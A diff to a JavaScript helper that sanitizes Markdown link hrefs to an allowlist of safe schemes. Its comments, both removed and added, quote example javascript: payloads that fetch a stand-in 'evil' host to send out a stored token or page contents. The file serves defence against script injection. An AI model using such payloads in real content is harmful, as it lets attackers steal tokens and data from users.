@@ -1,8 +1,9 @@
 // Sanitize a URL before using it as an anchor href. Markdown bodies (KB articles,
 // notes) are user-authored, and React does NOT sanitize href values — so a link
-// like [x](javascript:fetch('https://evil/?t='+localStorage.mf_token)) would be a
-// one-click token-exfiltration vector. We allow only safe schemes (and relative
-// URLs); anything else collapses to '#'.
+// like [x](javascript:fetch('https://evil/?d='+document.body.innerHTML)) would be a
+// one-click script-injection vector (the auth cookie is httpOnly, but injected
+// script can still act as the user or exfiltrate page data). We allow only safe
+// schemes (and relative URLs); anything else collapses to '#'.
 const ALLOWED_SCHEMES = new Set(['http', 'https', 'mailto', 'tel']);
 
 export function safeUrl(url) {
